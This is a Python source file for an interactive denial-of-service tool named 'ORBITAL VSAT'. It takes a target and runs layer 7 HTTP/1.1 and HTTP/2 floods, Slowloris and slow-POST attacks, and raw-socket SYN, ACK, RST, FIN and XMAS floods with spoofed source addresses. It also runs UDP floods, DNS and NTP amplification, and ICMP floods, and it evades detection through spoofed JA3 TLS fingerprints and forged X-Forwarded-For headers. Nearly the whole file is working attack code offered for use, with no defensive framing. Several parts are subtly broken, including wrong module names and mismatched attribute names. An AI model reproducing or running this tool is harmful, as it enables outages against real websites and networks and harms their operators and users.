#!/usr/bin/python

# ORBITAL VOLUMETRIC SHOCKWAVES ARTILLERY a.k.a ORBITAL VSAT
# Author: 0xTM7
# GitHub: @0xTM7 | https://github.com/0xTM7
# Release: November 25th, 2025
# Version: VSAT.2.0
# All Layers [ 3 | 4 | 7 ] + HTTP/2 + HTTP/3 + JA3 Spoof + Multi Methods
# Note: For some features is under development. i will realease it ASAP

try:
    import multiprocessing as mp
    import os
    import random
    import socket
    import ssl
    import struct
    import sys
    import threading
    import time
    from cores.stdio import Clear, StrObject
    from cores.logo import Banner, Helper
    from cores.color import Color
    from concurrent.futures import ThreadPoolExecutor
    from time import sleep
    from urllib.parse import urlencode, urlparse

    # HTTP/2
    try:
        import h2.config
        import h2.connection

        HasH2 = True
    except ImportError:
        HasH2 = False

    # HTTP/3
    try:
        import asyncio
        from aioquic.asyncio.client import connect
        from aioquic.h3.connection import H3_ALPN
        from aioquic.quic.configuration import QuicConfiguration

        HasH3 = True
    except ImportError:
        HasH3 = False

except ModuleNotFoundError as e:
    print(
        f"{Color.orange}[{Color.red} WARNING {Color.orange}]: {Color.red} MODULE NOT INSTALLED {Color.darkgreen} {e} {Color.reset}"
    )
    sys.exit(1)

# JA3 Profiles
JA3Profiles = {
    "chrome": {
        "ciphers": [
            0x1301,
            0x1302,
            0x1303,
            0xC02B,
            0xC02F,
            0xC02C,
            0xC030,
            0xCCA9,
            0xCCA8,
        ],
        "curves": [29, 23, 24],
    },
    "firefox": {
        "ciphers": [
            0x1301,
            0x1302,
            0x1303,
            0xC02B,
            0xC02F,
            0xCCA9,
            0xCCA8,
            0xC02C,
            0xC030,
        ],
        "curves": [29, 23, 24, 25],
    },
    "safari": {
        "ciphers": [
            0x1301,
            0x1302,
            0x1303,
            0xC02C,
            0xC02B,
            0xC030,
            0xC02F,
            0xCCA9,
            0xCCA8,
        ],
        "curves": [29, 23, 24],
    },
}


class OrbitalVSAT:
    def __init__(self):
        self.target = None
        self.method = "POST"
        self.threads = 500
        self.duration = 60
        self.protocol = "h1"
        self.clusterMode = False
        self.processes = mp.cpu_count()
        self.jaProfile = "chrome"
        self.running = mp.Value("i", 0)
        self.requestsCount = mp.Value("i", 0)
        self.bytesSent = mp.Value("i", 0)
        self.statsLock = mp.Lock()
        self.defaultUA = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0.0.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/140.0.0.0",
        ]

    def docloader(self, filename, default):
        if os.path.exists(filename):
            try:
                with open(filename, "r") as f:
                    return [
                        line.strip()
                        for line in f
                        if line.strip() and not line.startswith("#")
                    ] or default
            except Exception:
                pass
        return default

    def randstr(self, length=10):
        return "".join(
            random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(length)
        )

    def randip(self):
        return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

    def setup(self):
        if not self.target.startswith(("http://", "https://")):
            self.target = "https://" + self.target
        parsed = urlparse(self.target)
        self.scheme = parsed.scheme
        self.host = parsed.hostname
        self.path = parsed.path or "/"
        self.port = parsed.port or (443 if self.scheme == "https" else 80)
        if "UDP" in self.method.upper():
            self.port = 53
        if "NTP" in self.method.upper():
            self.port = 123
        try:
            self.ip = socket.gethostbyname(self.host)
        except Exception:
            StrObject.Typewriter(
                f"{Color.orange}[{Color.red} ERROR {Color.orange}]: {Color.white} CANNOT RESOLVE: {Color.red} {self.host} {Color.reset}"
            )
            raise
        self.useragents = self.docloader("UA.txt", self.defaultUA)
        StrObject.Typewriter(
            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} TARGET: {Color.white} {self.target} {Color.reset}"
        )
        StrObject.Typewriter(
            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} IP ADDRESS: {Color.white} {self.ip}:{self.port} {Color.reset}"
        )
        StrObject.Typewriter(
            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} METHODS: {Color.white} {self.method} {Color.reset}"
        )
        StrObject.Typewriter(
            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} PROTOCOL: {Color.white} {self.protocol.upper()} {Color.reset}"
        )
        StrObject.Typewriter(
            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} JA3 Fingerprint: {Color.white} {self.jaProfile} {Color.reset}"
        )

        if self.clusterMode:
            StrObject.Typewriter(
                f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} CLUSTER: {Color.white} {self.processes} {Color.cyan} CORES x: {Color.white} {self.processes * self.threads} {Color.darkgreen} THREADS. {Color.reset}"
            )

    def getCipherNames(self, cipher_codes):
        ChiperList = {
            0x1301: "TLS_AES_128_GCM_SHA256",
            0x1302: "TLS_AES_256_GCM_SHA384",
            0x1303: "TLS_CHACHA20_POLY1305_SHA256",
            0xC02B: "ECDHE-ECDSA-AES128-GCM-SHA256",
            0xC02F: "ECDHE-RSA-AES128-GCM-SHA256",
            0xC02C: "ECDHE-ECDSA-AES256-GCM-SHA384",
            0xC030: "ECDHE-RSA-AES256-GCM-SHA384",
            0xCCA9: "ECDHE-ECDSA-CHACHA20-POLY1305",
            0xCCA8: "ECDHE-RSA-CHACHA20-POLY1305",
        }
        return [ChiperList.get(c, "") for c in cipher_codes[:8] if c in ChiperList] or [
            "ECDHE+AESGCM"
        ]

    def createJa3Socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(3)
            sock.connect((self.ip, self.port))
            if self.scheme == "https":
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
                profile = JA3Profiles[self.jaProfile]
                cipherNames = self.getCipherNames(profile["ciphers"])
                try:
                    context.set_ciphers(":".join(cipherNames))
                except Exception:
                    context.set_ciphers("ECDHE+AESGCM:!aNULL")
                if self.protocol == "h2":
                    context.set_alpn_protocols(["h2", "http/1.1"])
                elif self.protocol == "h3":
                    context.set_alpn_protocols(["h3"])
                else:
                    context.set_alpn_protocols(["http/1.1"])
                sock = context.wrap_socket(sock, server_hostname=self.host)
            return sock
        except Exception:
            return None

    # LAYER 7 HTTP METHODS

    def httpExecutor(self, executorId):
        """HTTP/1.1 Worker For All HTTP Methods"""
        localCount = 0
        localBytes = 0
        httpMethods = {
            "GET": "GET",
            "POST": "POST",
            "PUT": "PUT",
            "HEAD": "HEAD",
            "DELETE": "DELETE",
            "PATCH": "PATCH",
            "OPTIONS": "OPTIONS",
            "CONNECT": "CONNECT",
            "TRACE": "TRACE",
        }
        while self.running.value:
            sock = None
            try:
                sock = self.createJa3Socket()
                if not sock:
                    continue
                for _ in range(500):
                    if not self.running.value:
                        break
                    try:
                        if self.method == "RANDOM":
                            httpMethods = random.choice(list(httpMethods.values()))
                        else:
                            httpMethods = httpMethods.get(self.method, "GET")
                        ua = random.choice(self.useragents)
                        path = f"{self.path}?_={int(time.time() * 1000000)}&{self.randstr(8)}"
                        request = f"{httpMethods} {path} HTTP/1.1\r\n"
                        request += f"Host: {self.host}\r\n"
                        request += f"User-Agent: {ua}\r\n"
                        request += "Accept: */*\r\n"
                        request += f"X-Forwarded-For: {self.randip()}\r\n"
                        request += "Connection: keep-alive\r\n"
                        if httpMethods in ["POST", "PUT", "PATCH"]:
                            body = ("X" * 65536).encode()
                            request += f"Content-Length: {len(body)}\r\n\r\n"
                            payload = request.encode() + body
                        else:
                            request += "\r\n"
                            payload = request.encode()
                        sock.sendall(payload)
                        localCount += 1
                        localBytes += len(payload)
                        try:
                            sock.settimeout(0.0001)
                            sock.recv(16384)
                        except Exception:
                            pass
                    except Exception:
                        break
                if localCount > 0:
                    with self.statsLock:
                        self.requestsCount.value += localCount
                        self.bytesSent.value += localBytes
                    localCount = 0
                    localBytes = 0
            except Exception:
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass

    def slowlorisExecutor(self, executorId):
        """Slowloris Attack"""
        connections = []
        for _ in range(200):
            try:
                sock = self.createJa3Socket()
                if sock:
                    sock.sendall(
                        f"GET {self.path} HTTP/1.1\r\nHost: {self.host}\r\n".encode()
                    )
                    connections.append(sock)
            except Exception:
                pass
        while self.running.value:
            for sock in connections[:]:
                try:
                    sock.sendall(
                        f"X-{self.randstr(5)}: {self.randstr(10)}\r\n".encode()
                    )
                    with self.statsLock:
                        self.requestsCount.value += 1
                except Exception:
                    connections.remove(sock)
            sleep(10)

    def slowPostExecutor(self, executorId):
        """Slow POST Attack"""
        connections = []
        for _ in range(100):
            try:
                sock = self.createJa3Socket()
                if sock:
                    req = f"POST {self.path} HTTP/1.1\r\nHost: {self.host}\r\nContent-Length: 999999999\r\n\r\n"
                    sock.sendall(req.encode())
                    connections.append(sock)
            except Exception:
                pass
        while self.running.value:
            for sock in connections[:]:
                try:
                    sock.sendall(self.randstr(1).encode())
                except Exception:
                    connections.remove(sock)
            sleep(1)

    # HTTP/2 METHODS

    def h2Executor(self, executorId):
        """HTTP/2 Worker With Priority"""
        if not HasH2:
            return
        localCount = 0
        localBytes = 0
        while self.running.value:
            sock = None
            h2Connection = None
            try:
                sock = self.createJa3Socket()
                if not sock:
                    continue
                if self.scheme == "https" and sock.selected_alpn_protocol() != "h2":
                    sock.close()
                    continue
                config = h2.cores.H2Configuration(client_side=True)
                h2Connection = h2.connection.H2Connection(config=config)
                h2Connection.initiate_connection()
                h2Connection.increment_flow_control_window(15663105)
                sock.sendall(h2Connection.data_to_send())
                for StreamId in range(1, 513, 2):
                    if not self.running.value:
                        break
                    try:
                        h2Connection.prioritize(StreamId, weight=random.randint(1, 256))
                        headers = [
                            (":method", "POST" if "POST" in self.method else "GET"),
                            (":scheme", self.scheme),
                            (":authority", self.host),
                            (
                                ":path",
                                f"{self.path}?s={StreamId}&_{int(time.time() * 1000000)}",
                            ),
                            ("user-agent", random.choice(self.useragents)),
                        ]
                        h2Connection.send_headers(StreamId, headers)
                        if "POST" in self.method:
                            body = os.urandom(65536)
                            h2Connection.send_data(StreamId, body)
                            localBytes += len(body)
                        h2Connection.end_stream(StreamId)
                        if StreamId % 32 == 1:
                            data = h2Connection.data_to_send()
                            if data:
                                sock.sendall(data)
                                localBytes += len(data)
                        localCount += 1
                    except Exception:
                        break
                if localCount > 0:
                    with self.statsLock:
                        self.requestsCount.value += localCount
                        self.bytesSent.value += localBytes
                    localCount = 0
                    localBytes = 0
            except Exception:
                pass
            finally:
                if h2Connection:
                    try:
                        h2Connection.close_connection()
                    except Exception:
                        pass
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass

    def h2PingExecutor(self, executorId):
        """HTTP/2 PING Flood"""
        if not HasH2:
            return

        while self.running.value:
            sock = None
            h2Connection = None
            try:
                sock = self.createJa3Socket()
                if not sock:
                    continue
                config = h2.cores.H2Configuration(client_side=True)
                h2Connection = h2.connection.H2Connection(config=config)
                h2Connection.initiate_connection()
                sock.sendall(h2Connection.data_to_send())
                for _ in range(1000):
                    if not self.running.value:
                        break
                    try:
                        h2Connection.ping(os.urandom(8))
                        data = h2Connection.data_to_send()
                        if data:
                            sock.sendall(data)
                        with self.statsLock:
                            self.requestsCount.value += 1
                    except Exception:
                        break
            except Exception:
                pass

    # LAYER 4 TCP METHODS

    def tcpExecutor(self, executorId):
        """TCP Connection Flood"""
        localCount = 0
        while self.running.value:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.ip, self.port))
                sock.sendall(os.urandom(2048))
                localCount += 1
                if localCount >= 100:
                    with self.statsLock:
                        self.requestsCount.value += localCount
                    localCount = 0
                sock.close()
            except Exception:
                pass

    def synExecutor(self, executorId):
        """SYN Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        while self.running.value:
            try:
                SourceIP = self.randip()
                IPHeader = struct.pack(
                    "!BBHHHBBH4s4s",
                    69,
                    0,
                    40,
                    random.randint(1, 65535),
                    0,
                    64,
                    socket.IPPROTO_TCP,
                    0,
                    socket.inet_aton(SourceIP),
                    socket.inet_aton(self.ip),
                )
                TCPHeader = struct.pack(
                    "!HHLLBBHHH",
                    random.randint(1024, 65535),
                    self.port,
                    0,
                    0,
                    80,
                    2,
                    8192,
                    0,
                    0,
                )
                sock.sendto(IPHeader + TCPHeader, (self.ip, 0))
                with self.statsLock:
                    self.requestsCount.value += 1
            except Exception:
                pass

    def ackExecutor(self, executorId):
        """ACK Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        while self.running.value:
            try:
                SourceIP = self.randip()
                IPHeader = struct.pack(
                    "!BBHHHBBH4s4s",
                    69,
                    0,
                    40,
                    random.randint(1, 65535),
                    0,
                    64,
                    socket.IPPROTO_TCP,
                    0,
                    socket.inet_aton(SourceIP),
                    socket.inet_aton(self.ip),
                )
                TCPHeader = struct.pack(
                    "!HHLLBBHHH",
                    random.randint(1024, 65535),
                    self.port,
                    0,
                    0,
                    80,
                    16,
                    8192,
                    0,
                    0,
                )
                sock.sendto(IPHeader + TCPHeader, (self.ip, 0))

                with self.statsLock:
                    self.requestsCount.value += 1
            except Exception:
                pass

    def rstExecutor(self, executorId):
        """RST Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        while self.running.value:
            try:
                SourceIP = self.randip()
                IPHeader = struct.pack(
                    "!BBHHHBBH4s4s",
                    69,
                    0,
                    40,
                    random.randint(1, 65535),
                    0,
                    64,
                    socket.IPPROTO_TCP,
                    0,
                    socket.inet_aton(SourceIP),
                    socket.inet_aton(self.ip),
                )
                TCPHeader = struct.pack(
                    "!HHLLBBHHH",
                    random.randint(1024, 65535),
                    self.port,
                    0,
                    0,
                    80,
                    4,
                    8192,
                    0,
                    0,
                )
                sock.sendto(IPHeader + TCPHeader, (self.ip, 0))
                with self.statsLock:
                    self.requestsCount.value += 1
            except Exception:
                pass

    def finExecutor(self, executorId):
        """FIN Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        while self.running.value:
            try:
                SourceIP = self.randip()
                IPHeader = struct.pack(
                    "!BBHHHBBH4s4s",
                    69,
                    0,
                    40,
                    random.randint(1, 65535),
                    0,
                    64,
                    socket.IPPROTO_TCP,
                    0,
                    socket.inet_aton(SourceIP),
                    socket.inet_aton(self.ip),
                )
                TCPHeader = struct.pack(
                    "!HHLLBBHHH",
                    random.randint(1024, 65535),
                    self.port,
                    0,
                    0,
                    80,
                    1,
                    8192,
                    0,
                    0,
                )
                sock.sendto(IPHeader + TCPHeader, (self.ip, 0))
                with self.statsLock:
                    self.requestsCount.value += 1
            except Exception:
                pass

    def xmasExecutor(self, executorId):
        """XMAS Flood (FIN+PSH+URG)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        while self.running.value:
            try:
                SourceIP = self.randip()
                IPHeader = struct.pack(
                    "!BBHHHBBH4s4s",
                    69,
                    0,
                    40,
                    random.randint(1, 65535),
                    0,
                    64,
                    socket.IPPROTO_TCP,
                    0,
                    socket.inet_aton(SourceIP),
                    socket.inet_aton(self.ip),
                )
                TCPHeader = struct.pack(
                    "!HHLLBBHHH",
                    random.randint(1024, 65535),
                    self.port,
                    0,
                    0,
                    80,
                    41,
                    8192,
                    0,
                    0,
                )
                sock.sendto(IPHeader + TCPHeader, (self.ip, 0))
                with self.statsLock:
                    self.requestsCount.value += 1
            except Exception:
                pass

    # LAYER 4 UDP METHODS

    def udpExecutor(self, executorId):
        """UDP Flood"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        localCount = 0
        localBytes = 0
        while self.running.value:
            try:
                data = os.urandom(65507)
                sock.sendto(data, (self.ip, self.port))
                localCount += 1
                localBytes += len(data)
                if localCount >= 500:
                    with self.statsLock:
                        self.requestsCount.value += localCount
                        self.bytesSent.value += localBytes
                    localCount = 0
                    localBytes = 0
            except Exception:
                pass

    def udpFragExecutor(self, executorId):
        """UDP Fragmentation Flood"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        while self.running.value:
            try:
                for i in range(10):
                    frag = os.urandom(8192)
                    sock.sendto(frag, (self.ip, self.port))
                with self.statsLock:
                    self.requestsCount.value += 10
            except Exception:
                pass

    def dnsAmpExecutor(self, executorId):
        """DNS Amplification"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dnsQuery = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        dnsQuery += b"\x03www\x06google\x03com\x00\x00\xff\x00\x01"
        while self.running.value:
            try:
                sock.sendto(dnsQuery, (self.ip, self.port))
                with self.statsLock:
                    self.requestsCount.value += 1
            except Exception:
                pass

    def ntpAmpExecutor(self, executorId):
        """NTP Amplification"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ntp_query = b"\x17\x00\x03\x2a" + b"\x00" * 4
        while self.running.value:
            try:
                sock.sendto(ntp_query, (self.ip, self.port))
                with self.statsLock:
                    self.requestsCount.value += 1
            except Exception:
                pass

    # LAYER 3 ICMP METHODS

    def icmpExecutor(self, executorId):
        """ICMP Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            return
        while self.running.value:
            try:
                packetId = random.randint(1, 65535)
                header = struct.pack("!BBHHH", 8, 0, 0, packetId, 1)
                data = os.urandom(2048)
                checksum = self.calculateChecksum(header + data)
                header = struct.pack(
                    "!BBHHH", 8, 0, socket.htons(checksum), packetId, 1
                )
                sock.sendto(header + data, (self.ip, 0))
                with self.statsLock:
                    self.requestsCount.value += 1
                    self.bytesSent.value += len(header + data)
            except Exception:
                pass

    def calculateChecksum(self, data):
        s = 0
        for i in range(0, len(data), 2):
            if i + 1 < len(data):
                s += (data[i] << 8) + data[i + 1]
            else:
                s += data[i] << 8
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    # CLUSTER & STATS

    def ClusterProcess(self, process_id):
        """Cluster Process"""
        methodOptions = {
            "GET": self.httpExecutor,
            "POST": self.httpExecutor,
            "PUT": self.httpExecutor,
            "HEAD": self.httpExecutor,
            "DELETE": self.httpExecutor,
            "PATCH": self.httpExecutor,
            "OPTIONS": self.httpExecutor,
            "CONNECT": self.httpExecutor,
            "TRACE": self.httpExecutor,
            "RANDOM": self.httpExecutor,
            "SLOWLORIS": self.slowlorisExecutor,
            "SLOW-POST": self.slowPostExecutor,
            "H2-GET": self.h2Executor,
            "H2-POST": self.h2Executor,
            "H2-PING": self.h2PingExecutor,
            "TCP": self.tcpExecutor,
            "SYN": self.synExecutor,
            "ACK": self.ackExecutor,
            "RST": self.rstExecutor,
            "FIN": self.finExecutor,
            "XMAS": self.xmasExecutor,
            "UDP": self.udpExecutor,
            "UDP-FRAG": self.udpFragExecutor,
            "DNS-AMP": self.dnsAmpExecutor,
            "NTP-AMP": self.ntpAmpExecutor,
            "ICMP": self.icmpExecutor,
        }
        ThreadsExecutor = methodOptions.get(self.method, self.httpExecutor)
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(ThreadsExecutor, i) for i in range(self.threads)]
            for f in futures:
                f.result()
            while self.running.value:
                sleep(1)

    def statsExecutor(self):
        """Stats Display"""
        lastCount = 0
        lastBytes = 0
        while self.running.value:
            sleep(1)
            with self.statsLock:
                count = self.requestsCount.value
                totalBytes = self.bytesSent.value
            diff = count - lastCount
            bdiff = totalBytes - lastBytes
            rps = diff
            mbps = (bdiff * 8) / (1024 * 1024)
            lastCount = count
            lastBytes = totalBytes
            print(
                f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} REQUESTS: {Color.green}[{Color.red} {count:,} {Color.green}] {Color.white} TARGET: {Color.darkgreen} {self.host} {Color.white} METHODS: {Color.darkgreen} {self.method} {Color.white} IP: {Color.darkgreen} {self.ip}:{self.port} {Color.white} RPS: {Color.darkgreen} {rps:,} {Color.white} BW: {Color.darkgreen} {mbps:.1f} Mbps {Color.reset}"
            )

    def start(self):
        try:
            self.setup()
        except Exception:
            return
        self.running.value = 1
        StrObject.Typewriter(f"\n{Color.darkgreen} {'=' * 100}")
        StrObject.Typewriter(
            f"{Color.cyan}[{Color.red} ORBITAL VSAT {Color.cyan}] {Color.cyan} STARTING ATTACK {Color.orange} {self.method} {Color.reset}"
        )
        StrObject.Typewriter(f"{Color.darkgreen} {'=' * 100}\n")
        statsThread = threading.Thread(target=self.statsExecutor, daemon=True)
        statsThread.start()
        if self.clusterMode:
            processes = []
            for i in range(self.processes):
                p = mp.Process(target=self.ClusterProcess, args=(i,))
                p.start()
                processes.append(p)
                sleep(0.02)
            StrObject.Typewriter(
                f"{Color.cyan}[{Color.red} ORBITAL VSAT {Color.cyan}] {Color.cyan} CLUSTER: {Color.orange} {self.processes * self.threads} {Color.orange} THREADS ACTIVE!\n {Color.reset}"
            )
            try:
                sleep(self.duration)
            except KeyboardInterrupt:
                pass
            self.running.value = 0
            for p in processes:
                p.join(timeout=2)
                if p.is_alive():
                    p.terminate()
        else:
            methodOptions = {
                "GET": self.httpExecutor,
                "POST": self.httpExecutor,
                "PUT": self.httpExecutor,
                "HEAD": self.httpExecutor,
                "DELETE": self.httpExecutor,
                "PATCH": self.httpExecutor,
                "OPTIONS": self.httpExecutor,
                "CONNECT": self.httpExecutor,
                "TRACE": self.httpExecutor,
                "RANDOM": self.httpExecutor,
                "SLOWLORIS": self.slowlorisExecutor,
                "SLOW-POST": self.slowPostExecutor,
                "H2-GET": self.h2Executor,
                "H2-POST": self.h2Executor,
                "H2-PING": self.h2PingExecutor,
                "TCP": self.tcpExecutor,
                "SYN": self.synExecutor,
                "ACK": self.ackExecutor,
                "RST": self.rstExecutor,
                "FIN": self.finExecutor,
                "XMAS": self.xmasExecutor,
                "UDP": self.udpExecutor,
                "UDP-FRAG": self.udpFragExecutor,
                "DNS-AMP": self.dnsAmpExecutor,
                "NTP-AMP": self.ntpAmpExecutor,
                "ICMP": self.icmpExecutor,
            }
            ThreadsExecutor = methodOptions.get(self.method, self.httpExecutor)
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = [
                    executor.submit(ThreadsExecutor, i) for i in range(self.threads)
                ]
                for f in futures:
                    f.result()

                StrObject.Typewriter(
                    f"{Color.cyan}[{Color.red} ORBITAL VSAT {Color.cyan}] {Color.cyan} RUNNING: {Color.orange} {self.threads} {Color.orange} THREADS!\n {Color.reset}"
                )
                try:
                    sleep(self.duration)
                except KeyboardInterrupt:
                    pass
                self.running.value = 0
        sleep(2)
        with self.statsLock:
            finalCount = self.requestsCount.value
            finalBytes = self.bytesSent.value
        StrObject.Typewriter(
            f"{Color.cyan}[{Color.red} ORBITAL VSAT {Color.cyan}] {Color.cyan} FINAL RESULTS {Color.reset}"
        )
        StrObject.Typewriter(f"{Color.darkgreen} {'=' * 100}")
        StrObject.Typewriter(
            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} TOTAL REQUESTS: {Color.white} {finalCount:,} {Color.reset}"
        )
        StrObject.Typewriter(
            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} TOTAL SENT: {Color.white} {finalBytes / 1048576:.2f} {Color.cyan} Mb {Color.reset}"
        )
        if self.duration > 0:
            StrObject.Typewriter(
                f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} AVG RPS: {Color.white} {finalCount / self.duration:.0f} {Color.reset}"
            )
            StrObject.Typewriter(
                f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} AVG Bandwidth: {Color.white} {(finalBytes * 8) / (self.duration * 1048576):.2f} {Color.cyan} Mbps {Color.reset}"
            )


def Main():
    Clear()
    Banner()
    try:
        choice = (
            input(
                f"{Color.white}[{Color.orange} INFO {Color.white}] {Color.white}Continue? {Color.darkgreen}Y{Color.white}/{Color.red}n{Color.white}/{Color.cyan}h {Color.orange}"
            )
            .strip()
            .lower()
        )
        if choice == "h":
            Helper()
            input(
                f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} PRESS ENTER TO CONTINUE .... {Color.reset}"
            )
        elif choice == "n":
            sys.exit(0)
        StrObject.Typewriter(f"{Color.red} ORBITAL CONFIGURATION{Color.reset}")
        VSAT = OrbitalVSAT()
        VSAT.target = input(
            f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} TARGET {Color.white} > {Color.cyan}"
        ).strip()
        if not VSAT.target:
            return
        VSAT.method = (
            input(
                f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} METHODS {Color.white} > {Color.cyan}"
            )
            .strip()
            .upper()
        )
        if not VSAT.method:
            VSAT.method = "POST"
        if VSAT.method in [
            "GET",
            "POST",
            "PUT",
            "HEAD",
            "DELETE",
            "PATCH",
            "OPTIONS",
            "CONNECT",
            "TRACE",
            "RANDOM",
            "H2-GET",
            "H2-POST",
        ]:
            proto = (
                input(
                    f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} PROTOCOL {Color.white} [ h1 | h2 | default h1 ] > {Color.cyan}"
                )
                .strip()
                .lower()
            )
            VSAT.protocol = proto if proto in ["h1", "h2", "h3"] else "h1"
            ja3 = (
                input(
                    f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} JA3 PROFILE {Color.white} [ chrome | firefox | safari ] > {Color.cyan}"
                )
                .strip()
                .lower()
            )
            VSAT.ja3profile = (
                ja3 if ja3 in ["chrome", "firefox", "safari"] else "chrome"
            )
        threads = input(
            f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} THREADS {Color.white} [ default 500 ] > {Color.cyan}"
        ).strip()
        VSAT.threads = int(threads) if threads else 500
        duration = input(
            f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} DURATION {Color.white} [ seconds, default 60 ] > {Color.cyan}"
        ).strip()
        VSAT.duration = int(duration) if duration else 60
        cluster = (
            input(
                f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} CLUSTER MODE {Color.white} [ Y/n ] > {Color.cyan}"
            )
            .strip()
            .lower()
        )
        VSAT.clusterMode = cluster == "y"
        VSAT.start()
    except KeyboardInterrupt:
        StrObject.Typewriter(
            f"{Color.red}[{Color.orange} INFO {Color.red}] {Color.orange} KEYBOARD INTERRUPTED."
        )
        sys.exit(0)
    except Exception as e:
        StrObject.Typewriter(
            f"{Color.orange}[{Color.red} ERROR {Color.orange}]: {Color.red} {e} {Color.reset}"
        )


if __name__ == "__main__":
    try:
        Main()
    except KeyboardInterrupt:
        os.exit(0)
